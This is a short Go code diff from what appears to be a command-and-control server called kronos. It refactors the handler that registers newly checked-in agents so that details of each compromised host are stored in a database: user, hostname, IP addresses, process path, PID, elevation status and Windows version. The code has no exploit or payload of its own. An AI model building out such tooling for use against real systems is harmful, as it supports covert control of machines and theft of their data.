@@ -5,7 +5,12 @@ import (
 	"fmt"
 
 	"github.com/z3vxo/kronos/internal/byte"
+	"github.com/z3vxo/kronos/internal/database"
 )
+
+type AgentHandler struct {
+	DB *database.DB
+}
 
 func ConvertToWindowsVer(major, minor, build int16) string {
 	switch {
@@ -33,29 +38,21 @@ func ConvertToWindowsVer(major, minor, build int16) string {
 	}
 }
 
-func HandleClientRegister(ip string, r *bytes.Reader) error {
+func (h *AgentHandler) HandleClientRegister(ip string, r *bytes.Reader) error {
 	Client, err := byte.ExtractRegistrationDetails(ip, r)
 	if err != nil {
 		return err
 	}
 
-	fmt.Printf("[*] NEW AGENT\n")
-	fmt.Printf("\t[+] Guid: %s\n", Client.Guid)
-	fmt.Printf("\t[+] User: %s\n", Client.User)
-	fmt.Printf("\t[+] Host: %s\n", Client.Host)
-	fmt.Printf("\t[+] Internal IP: %s\n", Client.InternaIP)
-	fmt.Printf("\t[+] External IP: %s\n", Client.ExternalIP)
-	fmt.Printf("\t[+] Process Path: %s\n", Client.ProcPath)
-	fmt.Printf("\t[+] Proc Identifier: %d\n", Client.Pid)
-	if Client.IsElev == 0 {
-		fmt.Printf("\t[+] Is Elevated: NO\n")
-	} else {
-		fmt.Printf("\t[+] Is Elevated: YES\n")
+	ver := ConvertToWindowsVer(Client.Major, Client.Minor, Client.Build)
+	CodeName := GenCodeName()
+	err = h.DB.InsertAgent(Client.Guid, CodeName,
+		Client.User, Client.Host,
+		Client.InternaIP, Client.ExternalIP,
+		Client.ProcPath, ver, Client.Pid, Client.IsElev)
+	if err != nil {
+		return err
 	}
-	fmt.Printf("\t[+] Minor: %d\n", Client.Minor)
-	fmt.Printf("\t[+] Major: %d\n", Client.Major)
-	fmt.Printf("\t[+] Build: %d\n", Client.Build)
-	fmt.Printf("\t[+] Human Readable: %s\n", ConvertToWindowsVer(Client.Major, Client.Minor, Client.Build))
 
 	return nil
 
